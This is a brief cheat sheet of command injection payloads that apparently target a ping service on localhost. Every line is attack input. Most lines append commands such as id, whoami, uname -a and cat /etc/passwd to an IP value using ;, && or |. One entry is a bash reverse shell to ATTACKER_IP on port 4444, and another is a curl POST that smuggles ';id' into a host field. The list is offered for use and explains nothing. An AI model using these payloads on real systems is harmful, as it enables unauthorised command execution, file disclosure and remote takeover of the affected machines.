💡 Command Injection Payloads

Basic Injection

  • 127.0.0.1; id
  • 127.0.0.1; whoami
  • 127.0.0.1; cat /etc/passwd
  • 127.0.0.1; uname -a

Chaining

  • 127.0.0.1 && ls -la /
  • 127.0.0.1 | cat /etc/hostname
  • ; ls -la /home

Reverse Shell (careful!)

  • 127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

Via curl

  • curl -X POST http://localhost:9090/ping -d "host=127.0.0.1;id"
